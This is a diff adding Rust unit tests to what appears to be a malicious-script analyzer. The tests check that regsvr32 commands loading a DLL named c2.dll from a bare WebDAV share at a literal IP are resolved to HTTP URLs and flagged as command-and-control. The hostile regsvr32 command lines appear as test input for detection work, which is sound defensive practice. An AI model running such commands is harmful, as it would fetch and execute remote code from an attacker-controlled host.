@@ -19089,6 +19089,23 @@ $stageUrl = "ps-schemeless.example/stage.zip""#,
     }
 
     #[test]
+    fn regsvr32_bare_webdav_load_target_emits_url_argument() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::interp::interpret_line(r#"regsvr32 /s \\104.156.149.6\webdav\c2.dll"#, &mut env);
+
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::UrlArgument { cmd, url }
+                    if cmd == r#"regsvr32 /s \\104.156.149.6\webdav\c2.dll"#
+                        && url == "http://104.156.149.6/webdav/c2.dll"
+            )),
+            "bare WebDAV regsvr32 target did not synthesize URL: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn regsvr32_scriptlet_url_preserves_balanced_bracket_suffix() {
         let mut env = crate::env::Environment::new(&Config::default());
         crate::interp::interpret_line(
@@ -26585,6 +26602,33 @@ mod unc_webdav_tests {
             })
             .count();
         assert_eq!(count, 1, "expected 1 deduped trait, got {}", count);
+    }
+
+    #[test]
+    fn bare_webdav_share_regsvr32_target_resolves_http_url() {
+        let script = br#"start regsvr32 \\104.156.149.6\webdav\c2.dll"#;
+        let report = analyze(script, &Config::default());
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::UrlArgument { cmd, url }
+                    if cmd == "regsvr32 \\\\104.156.149.6\\webdav\\c2.dll"
+                        && url == "http://104.156.149.6/webdav/c2.dll"
+            )),
+            "regsvr32 bare WebDAV share URL was not resolved: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::UncWebDavC2 { host, port, http_url, .. }
+                    if host == "104.156.149.6"
+                        && port == "80"
+                        && http_url == "http://104.156.149.6/webdav/c2.dll"
+            )),
+            "regsvr32 bare WebDAV share was not surfaced as UncWebDavC2: {:?}",
+            report.traits
+        );
     }
 }
 
